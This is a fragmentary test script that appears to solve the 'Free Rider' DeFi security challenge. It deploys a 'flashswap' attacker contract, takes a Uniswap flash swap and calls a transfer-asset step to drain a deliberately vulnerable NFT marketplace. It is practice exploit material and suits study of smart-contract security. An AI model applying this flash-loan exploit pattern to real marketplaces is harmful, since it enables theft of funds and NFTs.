...
describe('[Challenge] Free Rider', function () {
    ...
    before(async function () {
        ...
        //如果合约创建过程中已经部署了合约，那么使用attach实例化，如果没有，则deploy
    ...
    it('Execution', async function () {
        ...
        const flashswap = await (await ethers.getContractFactory('flashswap',player)).deploy(
            weth.address,
            marketplace.address,
            nft.address,
            player.address,
        ...
        console.log(await weth.balanceOf(uniswapPair.address));
        await uniswapPair.connect(player).swap(NFT_PRICE,0,flashswap.address,1);
        //console.log(await flashswap.address);
        await flashswap.transferasset()
